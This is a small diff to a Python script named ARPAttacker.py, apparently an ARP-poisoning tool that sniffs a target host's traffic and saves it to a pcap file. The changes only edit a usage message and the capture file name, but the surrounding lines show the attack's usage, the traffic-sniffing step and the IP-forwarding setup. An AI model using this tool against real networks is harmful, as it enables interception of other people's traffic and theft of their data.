@@ -62,7 +62,7 @@ def usage():
 	print "-g --gateway   : The gateway IP in the posion network."
 	print "-p --packets   : The number of packet you want to sniff.Default :100.\n"
 	print "example: sudo python ARPAttacker.py -i en0 -t 192.168.1.3 -g 192.168.1.1 -p 100"
-	print "[*] Remember to set your forwarding mode first"
+	print "[*] Remember to set your forwarding mode first."
 	print "[*] If your computer is MAC.You should need to run this command."
 	print "[*] $:sudo sysctl -w net.inet.ip.forwarding=1"
 	sys.exit(0)
@@ -123,8 +123,9 @@ try:
 	bpf_filter = "ip host %s " % target_ip
 
 	packets = sniff(count= packet_count, filter= bpf_filter, iface= interface)
-
-	wrpcap('arp_attack %s.pcap' % str(datetime.datetime.now()),packets)
+	t = datetime.datetime.now()
+	packet_name = 'arp-%s-%s-%s-%s-%s.pcap' % (str(t.year),str(t.month),str(t.day),str(t.hour),str(t.minute))
+	wrpcap(packet_name,packets)
 
 	restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
 except KeyboardInterrupt:
